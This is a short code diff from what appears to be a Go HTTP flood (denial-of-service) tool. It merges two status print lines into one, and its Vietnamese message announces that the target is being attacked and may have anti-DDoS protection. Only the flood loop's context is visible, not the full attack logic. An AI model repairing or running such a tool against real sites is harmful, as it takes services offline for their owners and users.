@@ -130,8 +130,7 @@ func main() {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Println("-- menjmoi: dang tan cong muc tieu! --\nco ve nhu muc tieu co anti!\n"),
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("--menjmoi: dang tan cong muc tieu!--\nco ve nhu muc tieu co anti!\n\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
